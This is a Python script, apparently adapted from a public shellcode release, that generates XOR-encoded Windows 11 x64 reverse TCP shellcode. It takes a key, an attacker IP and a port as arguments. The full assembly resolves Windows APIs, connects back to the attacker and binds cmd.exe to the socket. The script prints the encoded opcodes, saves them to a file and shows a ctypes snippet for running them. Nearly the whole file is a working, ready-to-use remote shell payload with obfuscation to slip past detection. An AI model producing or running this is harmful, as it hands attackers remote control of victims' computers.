#!/usr/bin/env python3
# _*_ coding: utf8 _*_

# Description: Windows 11 x64 Reverse TCP Shell
# Architecture: x64
# OS: Microsoft Windows
# Author: hvictor (Victor Huerlimann)
# Shellcode Size: 564 bytes
# Repository:https://github.com/hvictor/shellcode-x64
#
# Special thanks to wetw0rk (Milton Valencia), from whom I drew inspiration for the indicated parts of the code: https://github.com/wetw0rk/Sickle
#
# Note: You will have to modify the line 193 of this file according to the attacker's IP and port:
# mov r9, 0x7901A8C029230002          # R9 = [IP = 192.168.1.121 | port = 0x2329 = 9001 | AF_INET = 2]
# The high DWORD is the IPv4 address in little-endian, followed by the 2-bytes port in little-endian, and the 2-bytes address family.
# PD: i (grisun0) only put the xored the key and the ip and port as arguments to make it more user friendly
# Usage: python3 main_xored2.py <xor_key> <ip> <port>
# i found the original code here: https://www.exploit-db.com/shellcodes/52298

import sys
import socket
from keystone import Ks, KS_ARCH_X86, KS_MODE_64

# --- Verificar argumentos: clave XOR, IP, puerto ---
if len(sys.argv) != 4:
    print(f"Uso: {sys.argv[0]} <clave_xor> <ip> <puerto>")
    print(f"Ejemplo: {sys.argv[0]} 0x4B 192.168.1.121 9001")
    print(f"Ejemplo: {sys.argv[0]} 75 10.0.0.5 4444")
    sys.exit(1)

# --- Procesar clave XOR ---
try:
    KEY = int(sys.argv[1], 0)  # Soporta decimal (75) y hex (0x4B)
except ValueError:
    print("Error: La clave debe ser un número válido (ej: 75 o 0x4B)")
    sys.exit(1)

# --- Procesar y validar IP ---
try:
    ip_packed = socket.inet_aton(sys.argv[2])
    ip_int = int.from_bytes(ip_packed, 'little')  # IP en little-endian
except socket.error:
    print("Error: Dirección IP inválida.")
    sys.exit(1)

# --- Procesar y validar puerto ---
try:
    PORT = int(sys.argv[3])
    if PORT < 1 or PORT > 65535:
        raise ValueError
    port_swapped = ((PORT & 0xFF) << 8) | ((PORT >> 8) & 0xFF)
except ValueError:
    print("Error: El puerto debe ser un número entre 1 y 65535.")
    sys.exit(1)

# --- Calcular r9_value: [AF_INET=2][port][IP] como QWORD little-endian ---
r9_value = (2 << 48) | (port_swapped << 32) | ip_int

# --- Plantilla del código en ensamblador con placeholder para IP:PORT ---
CODE = """
start:
    mov rbp, rsp
    sub rsp, 1600

resolve_kernel32:
    mov dl, 0x4b                        # dl = 'K'
    mov rcx, 0x60                       #
    mov r8, gs:[rcx]                    # R8 = address of PEB
    mov rdi, [r8 + 0x18]                # RDI = address of _PEB_LDR_DATA
    mov rdi, [rdi + 0x30]               # RDI = address of InInitializationOrderModuleList (first _LIST_ENTRY)
search:
    xor rcx, rcx
    mov rbx, [rdi + 0x10]               # RBX = DllBase
    mov rsi, [rdi + 0x40]               # RSI = address of UNICODE string BaseDllName.Buffer
    mov rdi, [rdi]                      # RDI = address of the next _LIST_ENTRY
    cmp [rsi + 0x18], cx                # Compare the 24-th UNICODE char with NULL
    jne search                          # If length of BaseDllName is not 12 UNICODE chars, continue searching
    cmp [rsi], dl                       # Compare the first UNICODE char with 'K'
    jne search                          # If the first UNICODE char is not 'K', continue searching

find_function_jmp:
    jmp callback                        # Jump to callback to make a negative (null byte free) call to get_find_function_addr

get_find_function_addr:                         
    pop rsi                             # The address of find_function is popped in RSI
    mov [rbp + 0x8], rsi                # The address of find_function is stored at (RBP + 8)
    jmp resolve_k32_sym                 # Once the address of find_function has been stored, proceed with the resolution of kernel32 symbols

callback:
    call get_find_function_addr         # When this call is done, the address of the 1st instruction find_function (add rsp, 8) is pushed to the stack
                                        # This is the address of find_function, and it will be popped in ESI (see get_find_function_addr).
                
find_function:         

# Current Stack Layout:
#---------------------------------------------------------------------------
# QWORD: Return Address (addr of instruction after "call find_function", see below)
# QWORD: Number of hash bytes + 8           <- RSP
# QWORD: <0x00000000> <Hash of CreateProcessA (4 bytes)>
# QWORD: <0x00000000> <Hash of LoadLibraryA (4 bytes)>
# ...
# QWORD: 0x0000000000000000
#---------------------------------------------------------------------------

    add rsp, 8                          # Point RSP to (Number of hash bytes + 8)
    pop rax                             # RAX = Number of hash bytes + 8
    push -1                             # Write -1 on the stack instead of (Number of hash bytes + 8)
    add rsp, rax                        # Add (Number of hash bytes + 8) to RSP: it now points to 0x0000000000000000

# Current Stack Layout:
#---------------------------------------------------------------------------
# QWORD: Return Address
# QWORD: 0xffffffffffffffff
# QWORD: <0x00000000> <Hash of CreateProcessA (4 bytes)>
# QWORD: <0x00000000> <Hash of LoadLibraryA (4 bytes)>
# ...
# QWORD: 0x0000000000000000                <- RSP
#---------------------------------------------------------------------------

find_function_loop2:
    xor rax, rax
    xor rdi, rdi
    mov eax, [rbx + 0x3c]               # EAX = offset to the PE Header of the module = e_lfanew
    mov edi, [rbx + rax + 0x88]         # EDI = RVA of the Export Directory Table of the module (1st field: VirtualAddress)
    add rdi, rbx                        # RDI = VMA of the Export Directory Table of the module
    mov ecx, [rdi + 24]                 # ECX = NumberOfNames (field of the Export Directory Table of the module)
    mov eax, [rdi + 32]                 # EAX = RVA of AddressOfNames (array of Name Addresses, field of the Export Directory Table)
    add rax, rbx                        # EAX = VMA of AddressOfNames
    mov [rbp - 8], rax                  # Save the VMA of AddressOfNames at (EBP - 8): this location is never touched for anything else

find_function_loop:
    dec ecx                             # Initially, ECX = NumberOfNames: decrement to get the index of the last name
    mov rax, [rbp - 8]                  # EAX = VMA of AddressOfNames
    mov esi, [rax + rcx * 4]            # ESI = RVA of the current Symbol Name
    add rsi, rbx                        # RSI = VMA of the current Symbol Name

compute_hash:
    xor rax, rax                        # EAX = 0
    cdq                                 # If the MSB of EAX = 1: EDX = 0x11111111
                                        # If the MSB of EAX = 0: EDX = 0x00000000 -> fills EDX with the sign of EAX
                                        # In this case, EDX = 0x00000000 because EAX = 0x00000000

compute_hash_repeat:
    ror edx, 0xd                        # Right-shift EDX of 13 bits
    add edx, eax                        # EDX += current EAX value
    lodsb                               # Load the byte pointed by ESI into AL
    test al, al                         # Test if the NULL terminator of the Symbol Name has been reached
    jnz compute_hash_repeat             # If the NULL terminator has been reached (ZF = 1), proceed to hash comparison
                                        # Else, perform the next iteration of the hash-computation algorithm
                                        # At this point, EDX contains the computed hash of the current symbol

find_function_compare:                          
    cmp edx, [rsp - 8]                  # Compare the computed hash with the hash of the wanted symbol
    jnz find_function_loop              # If ZF = 0, the hash is different: proceed with the next name from AddressOfNames
                                        # If ZF = 1, the hash is equal: symbol found: continue hereby
    mov edx, [rdi + 36]                 # EDX = RVA of the AddressOfNameOrdinals array
    add rdx, rbx                        # RDX = VMA of the AddressOfNameOrdinals array
    mov cx, [rdx + 2 * rcx]             # CX = Symbol's Ordinal (lower 16 bits of ECX)
    mov edx, [rdi + 28]                 # EDX = RVA of the AddressOfFunctions array
    add rdx, rbx                        # RDX = VMA of the AddressOfFunctions array
    mov eax, [rdx + 4 * rcx]            # EAX = AddressOfFunctions[ordinal] = RVA of the wanted symbol
    add rax, rbx                        # EAX = VMA of the wanted symbol
    push rax                            # Push the wanted symbol's VMA onto the stack:
                                        # ATTENTION: The symbol's VMA overwrites its Hash on the stack!
    mov rax, [rsp - 8]
    cmp rax, -1                         # If *(RSP - 8) is -1: ZF = 1: all wanted symbols have been resolved
    jnz find_function_loop2             # Until all wanted symbols have been resolved, continue looping

find_function_finish:                   # When we get here, all wanted symbols have been resolved: their VMAs are on the stack
    sub rsp, 16                         # Point RSP to the Return Address of find_function
    ret                                 # Return

resolve_k32_sym:
    mov rax, 0x00000000ec0e4e8e         # Hash of LoadLibraryA
    push rax
    mov rax, 0x0000000016b3fe72         # Hash of CreateProcessA
    push rax
    mov rax, 0x0000000078b5b983         # Hash of TerminateProcess
    push rax
    mov rax, 32                         # Push 32 onto the stack
    push rax
    call [rbp + 8]                      # Call to find_function (see find_function above)

load_ws2_32:
    mov rax, 0x0000000000006C6C         # 'll x00 x00 x00 x00 x00 x00' (reversed)
    push rax
    mov rax, 0x642E32335F327377         # 'ws2_32.d' (reversed)
    push rax
    mov rcx, rsp                        # Paramter 1 = address of "ws2_32.dll"
    sub rsp, 40                         # Create 40 bytes of room on the stack
    call [rsp + 80]                     # Call LoadLibraryA    
    nop

resolve_ws2_sym:
    mov rbx, rax                        # RBX = Base Address of ws2_32.dll
    mov rax, 0x0000000060aaf9ec         # Hash of connect
    push rax
    mov rax, 0x00000000adf509d9         # Hash of WSASocketA
    push rax
    mov rax, 0x000000003bfcedcb         # Hash of WSAStartup
    push rax
    mov rax, 32
    push rax                            # Push 32 (Number of Hashes pushed + 8)
    call [rbp + 8]                      # Call find_function

    sub rsp, 512

call_WSAStartup:
    mov rcx, 0x202                      # RCX = WinSock Version 2.2
    lea rdx, [rsp + 800]                # RDX = Address of output WSAData structure
    call [rsp + 520]                    # Call WSAStartup

call_WSASocketA:
    mov rcx, 2                          # Parameter af = 2 (AF_INET)
    mov rdx, 1                          # Parameter type = 1
    mov r8, 6                           # Parameter protocol = 6 (TCP)
    xor r9, r9                          # Parameter lpProtocolInfo = 0
    mov [rsp + 32], r9                  # Parameter dwFlags = 0
    mov [rsp + 40], r9                  # Parameter g = 0
    call [rsp + 528]                    # Call WSASocketA


call_connect:
    mov rsi, rax                        # Save socket fd in RSI
    mov rcx, rax                        # RCX = Parameter s = socket fd created with WSSocketA
    mov r8, 16                          # R8 = Parameter namelen = 16

    # Preparation of the sockaddr_in structure on the stack:
    # struct sockaddr_in {
    #   QWORD: [sin_addr (4 bytes) | sin_port (2 bytes) | sin_family (2 bytes)]
    #   QWORD: sin_zero = [00000000 00000000]
    # }
    mov r9, 0x{r9_value:016x}           # R9 = [IP={sys.argv[2]} | port={PORT} | AF_INET=2]
    lea rdx, [rsp + 800]                # RDX = Parameter name = Address of struct sockaddr_in
    mov [rdx], r9                       # Write fields: sin_addr, sin_port, sin_family
    xor r9, r9
    mov [rdx + 8], r9                   # Write field sin_zero
    call [rsp + 536]                    # Call connect

# Thanks to wetw0rk (Milton Valencia) for his setup_STARTUPINFOA implementation:
# https://github.com/wetw0rk/Sickle/blob/master/src/sickle/payloads/windows/x64/shell_reverse_tcp.py
create_STARTUPINFOA:
    lea rdi, [rsp + 800]
    add rdi, 0x300
    mov rbx, rdi
    xor eax, eax
    mov ecx, 0x20
    rep stosd                           # Zero-out 0x80 bytes
    mov eax, 0x68                       # EAX = sizeof(_STARTUPINFO) = 0x68
    mov [rbx], eax                      # Field lpStartInfo.cb = sizeof(_STARTUPINFO)
    mov eax, 0x100                      # EAX = STARTF_USESTDHANDLES
    mov [rbx + 0x3c], eax               # Field lpStartupInfo.dwFlags = STARTF_USESTDHANDLES
    mov [rbx + 0x50], rsi               # Field lpStartupInfo.hStdInput = socket fd
    mov [rbx + 0x58], rsi               # Field lpStartupInfo.hStdOutput = socket fd
    mov [rbx + 0x60], rsi               # Field lpStartupInfo.hStdError = socket fd    

# Thanks to wetw0rk (Milton Valencia) for his call_CreateProcessA implementation:
# https://github.com/wetw0rk/Sickle/blob/master/src/sickle/payloads/windows/x64/shell_reverse_tcp.py    
call_CreateProccessA:
    xor rax, rax
    xor rcx, rcx                        # Parameter lpApplicationName = 0
    lea rdx, [rsp + 800]                # Parameter lpCommandLine
    add rdx, 0x180
    mov eax, 0x646d63                   # EAX = "cmd"
    mov [rdx], rax                      # Write "cmd" in the lpCommandLine parameter
    xor r8, r8                          # Parameter lpProcessAttributes = 0
    xor r9, r9                          # Parameter lpThreadAttributes = 0
    xor rax, rax
    inc eax
    mov [rsp + 0x20], rax               # Parameter bInheritHandles = 1
    dec eax
    mov [rsp + 0x28], rax               # Parameter dwCreationFlags = 0
    mov [rsp + 0x30], rax               # Parameter lpEnvironment = 0
    mov [rsp + 0x38], rax               # Parameter lpCurrentDirectory = 0
    mov [rsp + 0x40], rbx               # Parameter lpStartupInfo = address of _STARTUPINFO
    add rbx, 0x68
    mov [rsp + 0x48], rbx               # Parameter lpProcessInformation = output address, right after _STARTUPINFO
    call [rsp + 616]

call_TerminateProcess:
    xor rcx, rcx
    dec rcx                             # Parameter hProcess = -1 = this process
    xor rdx, rdx                        # Parameter uExitCode = 0 (graceful termination)
    int3
    call [rsp + 608]                    # Call TerminateProcess              
"""

# --- Rellenar el template con el valor calculado ---
CODE = CODE.replace("{r9_value:016x}", f"{r9_value:016x}")

# --- Ensamblar ---
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, _ = ks.asm(CODE)

# --- Aplicar XOR a cada byte ---
xor_encoded = ''.join(f'\\x{((b ^ KEY) & 0xFF):02x}' for b in encoding)

# --- Salida ---
print(f"Opcodes = \"{xor_encoded}\"")
print(f"Size: {len(encoding)} bytes")
print(f"Key: 0x{KEY:02X}")
print(f"Target: {sys.argv[2]}:{PORT}")


with open("shellcode.txt", 'w+') as f:
    f.write(xor_encoded)

hello = """# Then you can execute like this afer un-xored (in python3):
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
"""
print(hello)
